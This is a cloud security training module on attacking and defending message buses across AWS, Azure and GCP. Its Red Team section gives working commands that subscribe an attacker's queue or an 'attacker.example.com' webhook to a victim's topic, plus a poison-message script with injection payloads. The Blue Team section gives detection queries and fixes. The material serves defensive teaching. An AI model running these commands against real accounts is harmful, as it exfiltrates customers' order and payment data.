# 08 — Queue, Topic, and Messaging Abuse

> **Level:** Intermediate–Advanced
> **Prereqs:** `../Compute-Container-Security/lambda-event-source-mapping-abuse.md`, `cloud-app-threat-model.md`
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Collection, Exfiltration, Persistence, Lateral Movement
> **Authorization scope:** Test messaging misconfigurations only in your own sandbox account. Do not create subscriptions that cross account boundaries without explicit permission from the other account owner.

## What & why

Managed message buses (SNS/SQS, Event Grid, Pub/Sub) extend trust within an account. A single misconfigured topic policy or queue subscription lets an attacker silently clone all production events — or inject poison messages that downstream consumers trust implicitly.

## The OnPrem reality

RabbitMQ with open STOMP plugin on port 61613, or ActiveMQ with no authentication. An attacker on the internal network could bind a queue to any exchange and siphon messages. Enterprise Service Bus (ESB) patterns had similar risks with open topic subscriptions.

## Core concepts

### Message bus trust model

```
┌──────────┐  Publish   ┌──────────────┐  Subscribe   ┌──────────┐
│ Producer │ ──────────▶│ Topic/Queue  │─────────────▶│ Consumer │
│ (trusted)│  (allowed) │  (policy)    │  (allowed)   │(app/func)│
└──────────┘            └──────────────┘              └──────────┘
                               │
                         ┌─────┴─────┐
                         │ Attacker  │ ← cross-account subscription
                         │ subscribes│    or poison publish
                         └───────────┘
```

### Attack vectors

| Vector | AWS | Azure | GCP |
|---|---|---|---|
| Cross-account subscribe | `sns:Subscribe` with attacker's queue ARN | Event Grid subscription to external webhook | Pub/Sub subscription across projects (if IAM allows) |
| Poison message injection | Publish to SQS queue that lacks source-account restriction | Publish to Service Bus topic with Send claim | Publish to Pub/Sub topic with `pubsub.topics.publish` |
| Message replay | SQS redrive to DLQ → replay from DLQ | Service Bus dead-letter → resubmit | Pub/Sub seek → replay acknowledged messages |
| Subscription enumeration | `sns:ListSubscriptionsByTopic` | List Event Grid subscriptions | `pubsub.subscriptions.list` |
| Event source mapping persistence | Lambda event source mapping to attacker's SQS queue | Function trigger bound to attacker queue | Cloud Function trigger from attacker topic |

### Least-privilege resource policies

| Resource | Restriction | AWS Example | Azure Example | GCP Example |
|---|---|---|---|---|
| Topic publish | Only specific IAM roles/services | `aws:SourceArn` condition | `Send` claim on Service Bus SAS policy | `pubsub.topics.publish` for specific SA |
| Queue consume | Only specific IAM roles | Queue policy with `aws:SourceAccount` | `Listen` claim on SAS policy | `pubsub.subscriptions.consume` for specific SA |
| Subscription creation | Only admin role | SCP `Deny sns:Subscribe` except for allowed roles | RBAC `EventGrid Contributor` restricted | IAM condition on `pubsub.subscriptions.create` |

## AWS — SNS/SQS

### Vulnerable: Wide-open SNS topic

```json
// SNS topic policy — allows ANY AWS account to subscribe
{
  "Version": "2008-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "*" },
    "Action": ["sns:Subscribe", "sns:Receive"],
    "Resource": "arn:aws:sns:us-east-1:111111111111:order-events"
  }]
}
```

### Fix: Restricted topic policy

```json
{
  "Version": "2008-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::111111111111:root" },
      "Action": "sns:Publish",
      "Resource": "arn:aws:sns:us-east-1:111111111111:order-events",
      "Condition": {
        "ArnLike": {
          "aws:SourceArn": [
            "arn:aws:states:us-east-1:111111111111:stateMachine:OrderProcessor-*",
            "arn:aws:lambda:us-east-1:111111111111:function:CreateOrder"
          ]
        }
      }
    },
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::111111111111:role/SQS-Consumer-Role" },
      "Action": ["sns:Subscribe", "sns:Receive"],
      "Resource": "arn:aws:sns:us-east-1:111111111111:order-events",
      "Condition": {
        "StringEquals": {
          "sns:Protocol": "sqs"
        }
      }
    }
  ]
}
```

### SQS queue policy with source account

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Service": "sns.amazonaws.com" },
    "Action": "sqs:SendMessage",
    "Resource": "arn:aws:sqs:us-east-1:111111111111:order-queue",
    "Condition": {
      "ArnEquals": {
        "aws:SourceArn": "arn:aws:sns:us-east-1:111111111111:order-events"
      }
    }
  }]
}
```

## Azure — Service Bus / Event Grid

### Vulnerable: Service Bus topic with full SAS

```bash
# Service Bus namespace SAS policy with "Manage" claim — allows create/delete queues
az servicebus namespace authorization-rule create \
  --resource-group prod-rg \
  --namespace-name app-messaging \
  --name RootManageSharedAccessKey \
  --rights Manage Send Listen  # Too broad
```

### Fix: Least-privilege SAS per entity

```bash
# Per-topic SAS with Send only for producer
az servicebus topic authorization-rule create \
  --resource-group prod-rg \
  --namespace-name app-messaging \
  --topic-name order-events \
  --name ProducerPolicy \
  --rights Send

# Per-subscription SAS with Listen only for consumer
az servicebus topic subscription rule create \
  --resource-group prod-rg \
  --namespace-name app-messaging \
  --topic-name order-events \
  --subscription-name order-processor \
  --name ConsumerPolicy \
  --rights Listen
```

### Event Grid subscription validation (fix)

```bash
# Event Grid subscription with webhook validation + Azure AD auth
az eventgrid event-subscription create \
  --name order-subscription \
  --source-resource-id /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/prod-rg/providers/Microsoft.EventGrid/topics/order-events \
  --endpoint https://app.example.com/api/webhooks/orders \
  --endpoint-type WebHook \
  --azure-active-directory-tenant-id 11111111-1111-1111-1111-111111111111 \
  --azure-active-directory-application-id-or-uri https://app.example.com \
  --max-delivery-attempts 3
```

## GCP — Pub/Sub

### Vulnerable: Open topic policy

```bash
# Pub/Sub topic with allUsers — ANYONE can publish
gcloud pubsub topics add-iam-policy-binding order-events \
  --member="allUsers" \
  --role="roles/pubsub.publisher"
```

### Fix: Restricted IAM bindings

```bash
# Only the specific service account can publish
gcloud pubsub topics add-iam-policy-binding order-events \
  --member="serviceAccount:order-service@example-project.iam.gserviceaccount.com" \
  --role="roles/pubsub.publisher"

# Only the specific service account can subscribe
gcloud pubsub subscriptions add-iam-policy-binding order-subscription \
  --member="serviceAccount:order-processor@example-project.iam.gserviceaccount.com" \
  --role="roles/pubsub.subscriber"
```

### Subscription with dead-letter and replay control

```bash
gcloud pubsub subscriptions create order-subscription \
  --topic=order-events \
  --dead-letter-topic=order-dlq \
  --max-delivery-attempts=5 \
  --ack-deadline=60 \
  --expiration-period=never \
  --enable-message-ordering
```

## OnPrem mapping (recap table)

| Concern | OnPrem (RabbitMQ) | AWS (SNS/SQS) | Azure (Service Bus/Event Grid) | GCP (Pub/Sub) |
|---|---|---|---|---|
| Publisher auth | username/password + vhost | IAM role + topic policy | SAS token (Send) / Managed Identity | IAM `pubsub.publisher` |
| Subscriber auth | username/password + vhost | IAM role + queue policy | SAS token (Listen) | IAM `pubsub.subscriber` |
| Cross-account/org access | None (internal) | SNS topic policy allows cross-account | Event Grid allows cross-tenant webhooks | Pub/Sub allows cross-project publish |
| Dead-letter handling | `x-dead-letter-exchange` | SQS DLQ + redrive policy | Service Bus dead-letter queue | Pub/Sub dead-letter topic |
| Replay risk | Shovel/Federation plugin | `sqs:ReceiveMessage` + DLQ redrive | Peek-Lock → resubmit | Pub/Sub seek to timestamp |
| Subscription authZ | No built-in (per exchange) | `sns:Subscribe` + topic policy | Event Grid subscription RBAC | `pubsub.subscriptions.create` IAM |

## 🔴 Red Team view

### Attack: Silent subscription + auto-redrive to external queue

**Scenario:** An SNS topic has `Principal: *` on `sns:Subscribe`. An attacker creates an SQS queue in their own AWS account and subscribes it:

```bash
# Attacker's AWS account: 999999999999
# Create queue in attacker account
aws sqs create-queue --queue-name stolen-events --profile attacker

# Get queue ARN
QUEUE_ARN="arn:aws:sqs:us-east-1:999999999999:stolen-events"

# Subscribe attacker's queue to victim's SNS topic
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:111111111111:order-events \
  --protocol sqs \
  --notification-endpoint "$QUEUE_ARN" \
  --profile attacker

# Attach queue policy to allow victim's SNS to send
aws sqs set-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/999999999999/stolen-events \
  --attributes '{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"sqs:SendMessage\",\"Resource\":\"arn:aws:sqs:us-east-1:999999999999:stolen-events\",\"Condition\":{\"ArnEquals\":{\"aws:SourceArn\":\"arn:aws:sns:us-east-1:111111111111:order-events\"}}}]}"
  }' \
  --profile attacker

# Now every order event (PII, payment info) is silently cloned to attacker's queue
```

### GCP equivalent

```bash
# Attacker project: attacker-project
gcloud pubsub subscriptions create order-siphon \
  --topic=projects/victim-project/topics/order-events \
  --topic-project=victim-project

# Attacker reads all messages
gcloud pubsub subscriptions pull order-siphon --auto-ack
```

### Azure equivalent

```bash
# Attacker sets up an external webhook endpoint
az eventgrid event-subscription create \
  --name silent-collector \
  --source-resource-id /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/prod-rg/providers/Microsoft.EventGrid/topics/order-events \
  --endpoint https://attacker.example.com/collect \
  --endpoint-type WebHook
# If Event Grid allows external webhook endpoints, all events are forwarded
```

### Attack: Poison message injection

**Scenario:** An SQS queue triggers a Lambda. The queue policy allows `sqs:SendMessage` from any principal in the account (default). An attacker with access to any IAM user in the account publishes a crafted message:

```python
import boto3

# Attacker with low-privilege IAM user in same account
sqs = boto3.client('sqs')
queue_url = 'https://sqs.us-east-1.amazonaws.com/111111111111/order-processor-queue'

poison_message = {
    "orderId": "'; DROP TABLES;--",
    "action": "refund",
    "amount": 999999,
    "credit_card": "4111111111111111",  # payload to trigger PCI alert
    "__proto__": { "isAdmin": True }   # prototype pollution attempt
}

sqs.send_message(
    QueueUrl=queue_url,
    MessageBody=json.dumps(poison_message)
)
```

The Lambda trusts the SQS body implicitly and processes the fake order.

### Artifacts left:

| Signal | Source |
|---|---|
| New subscription from unknown account | CloudTrail `sns:Subscribe`, Event Grid `Microsoft.EventGrid/eventSubscriptions/write` |
| SQS message from unexpected source IP (if sender tracked) | CloudTrail `sqs:SendMessage` sourceIPAddress |
| New IAM binding on Pub/Sub | Cloud Audit Logs `SetIamPolicy` on `pubsub.googleapis.com` |
| Cross-account data transfer | VPC Flow Logs (if VPC endpoint), or unexpected billing spike |

## 🔵 Blue Team view

### Prevention

| Control | AWS | Azure | GCP |
|---|---|---|---|
| Source account restriction | `aws:SourceAccount` in topic/queue policy | Event Grid: validate `aeg-event-type: SubscriptionValidation` | `pubsub.subscriptions.create` IAM restricted |
| SCP on subscribe | `Deny sns:Subscribe unless aws:PrincipalAccount = <account-id>` | Azure Policy: deny Event Grid subscriptions to external endpoints | Org policy: deny cross-project pubsub bindings |
| Message schema validation | Lambda validates JSON schema on receipt | Function validates event schema | Cloud Functions validates `data` field schema |
| Dead-letter audit | Monitor DLQ depth; alert on non-zero | Monitor dead-letter count | Monitor `subscription/num_undelivered_messages` |
| Encryption at rest + in transit | SQS/SNS default encrypt + TLS | Service Bus TLS + CMK | Pub/Sub TLS + CMEK |
| Least-privilege SAS/IAM per entity | Per-queue SQS policy, per-topic SNS policy | Per-entity SAS with only needed claims | Per-resource IAM (not project-level) |

### Detection rules

**Signal: Cross-account subscription created**

```sql
-- AWS CloudTrail
SELECT eventTime, userIdentity.arn, sourceIPAddress, requestParameters.topicArn,
       requestParameters.endpoint
FROM cloudtrail_logs
WHERE eventName = 'Subscribe'
  AND eventSource = 'sns.amazonaws.com'
  AND userIdentity.accountId != '111111111111'  -- your account
```

```kql
// Azure — Event Grid subscription to external endpoint
AzureActivity
| where OperationNameValue == "Microsoft.EventGrid/eventSubscriptions/write"
| where Properties contains "https://" and Properties !contains "https://<your-domain>"
| project TimeGenerated, Caller, Properties
```

```sql
-- GCP — Pub/Sub subscription across project
SELECT timestamp, protopayload_auditlog.authenticationInfo.principalEmail,
       protopayload_auditlog.resourceName
FROM `example-project.logs.cloudaudit_googleapis_com_activity`
WHERE protopayload_auditlog.methodName = 'google.pubsub.v1.Subscriber.CreateSubscription'
  AND protopayload_auditlog.resourceName NOT LIKE '%projects/example-project%'
```

**Signal: Unknown principal publishing**

```sql
-- AWS CloudTrail — SNS publish from unexpected role
SELECT eventTime, userIdentity.arn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'Publish'
  AND eventSource = 'sns.amazonaws.com'
  AND userIdentity.arn NOT IN (
    'arn:aws:sts::111111111111:assumed-role/OrderService-Role/*',
    'arn:aws:sts::111111111111:assumed-role/OrderLambda-Role/*'
  )
```

### SCP example — deny cross-account SNS subscribe

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Action": "sns:Subscribe",
    "Resource": "*",
    "Condition": {
      "StringNotEquals": {
        "aws:PrincipalAccount": "111111111111"
      }
    }
  }]
}
```

### Response steps

1. **Remove the unauthorized subscription** immediately.
2. **Block the attacker's account/principal** in the topic policy.
3. **Audit messages received** during the compromise window — rotate any credentials/secrets that passed through.
4. **Rotate any SAS keys** or access policies on the messaging namespace.
5. **Notify the attacker's account owner** (if legitimate AWS account hijacked).

## Hands-on lab

1. Create an SNS topic + SQS queue in your sandbox with correct `aws:SourceAccount` restriction.
2. Subscribe the queue. Publish a test message. Confirm receipt.
3. Temporarily remove the `aws:SourceAccount` condition and simulate a second (mock) AWS account subscribing.
4. Restore the condition and confirm the cross-account subscription is denied at the IAM policy level.

## References

- AWS SNS access control: https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-use-cases.html
- AWS SQS access policy examples: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-creating-custom-policies.html
- Azure Service Bus security: https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-sas
- GCP Pub/Sub access control: https://cloud.google.com/pubsub/docs/access-control
- Cross-ref: `../Compute-Container-Security/lambda-event-source-mapping-abuse.md` for event source persistence.
- Cross-ref: `../IAM/policy-as-code-checkers.md` for automated policy validation.
- Cross-ref: `supply-chain-and-3p-integrations.md` for webhook validation patterns.
